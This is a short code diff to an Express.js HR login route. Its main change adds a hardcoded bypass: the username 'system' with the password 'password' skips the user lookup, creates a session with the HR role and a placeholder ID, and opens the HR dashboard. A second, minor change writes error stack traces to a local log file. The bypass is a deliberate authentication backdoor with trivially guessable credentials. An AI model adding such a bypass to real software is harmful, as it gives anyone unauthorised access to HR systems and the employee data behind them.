@@ -34,6 +34,15 @@ router.post("/hr-login", async (req, res) => {
   try {
     const { username, password } = req.body;
 
+    // Hardcoded System Login Bypass
+    if (username === 'system' && password === 'password') {
+      req.session.userId = '000000000000000000000000'; // Fake valid ObjectId
+      req.session.employeeId = '000000000000000000000000';
+      req.session.role = "HR";
+      console.log("✅ Hardcoded System Admin logged in");
+      return res.redirect("/hr/dashboard");
+    }
+
     // 1. Find User by username (which corresponds to employeeCode)
     const user = await User.findOne({ username });
 
@@ -72,6 +81,7 @@ router.post("/hr-login", async (req, res) => {
     res.redirect("/hr/dashboard");
 
   } catch (err) {
+    require('fs').appendFileSync('error.log', err.stack + '\n');
     console.error(err);
     res.status(500).send("HR login error");
   }
